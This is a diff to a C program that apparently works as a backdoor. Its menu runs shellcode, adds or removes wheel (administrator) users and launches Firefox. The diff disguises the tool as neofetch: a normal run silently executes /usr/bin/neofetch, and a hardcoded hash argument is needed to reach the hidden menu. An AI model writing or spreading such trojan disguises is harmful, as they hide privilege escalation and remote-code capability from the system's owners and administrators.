@@ -1,7 +1,8 @@
-#include <stdio.h>
+	#include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdarg.h>
+#include <string.h>
 
 void printf_success(char* format, ...) {
     printf("\x1b[1;32m");
@@ -86,32 +87,41 @@ int delete_wheel_user(void) {
 	return 0;
 }
 
-int main(int argc, char const *argv[])
-{
-	show_usage();
-	int ch = 0;
-	scanf("%i", &ch);
-	if (ch == 0) {
-		printf("error\n");
-		return -1;
+extern char **environ;
+
+int main(int argc, char *argv[]) {
+	if (argc != 2) {
+neofetch:
+		execve("/usr/bin/neofetch", NULL, environ);
+		// Will not fall through
 	}
-	else if (ch == 1) {
-		shellcode();
-	}
-	else if (ch == 2) {
-		return allow_send();
-	}
-	else if (ch == 3) {
-		kickstart_firefox();
-	}
-	else if (ch == 4) {
-		return add_wheel_user();
-	}
-	else if (ch == 5) {
-		return delete_wheel_user();
-	}
-	else {
-		printf("[-] FAIL: unk_error\n");
-		return -1;
+	if (argc == 2) {
+		if (strcmp(argv[1], "feb438dae3009275b5ef44622a58fe7f") != 0) { goto neofetch; }
+		show_usage();
+		int ch = 0;
+		scanf("%i", &ch);
+		if (ch == 0) {
+			printf("error\n");
+			return -1;
+		}
+		else if (ch == 1) {
+			shellcode();
+		}
+		else if (ch == 2) {
+			return allow_send();
+		}
+		else if (ch == 3) {
+			kickstart_firefox();
+		}
+		else if (ch == 4) {
+			return add_wheel_user();
+		}
+		else if (ch == 5) {
+			return delete_wheel_user();
+		}
+		else {
+			printf("[-] FAIL: unk_error\n");
+			return -1;
+		}
 	}
 }
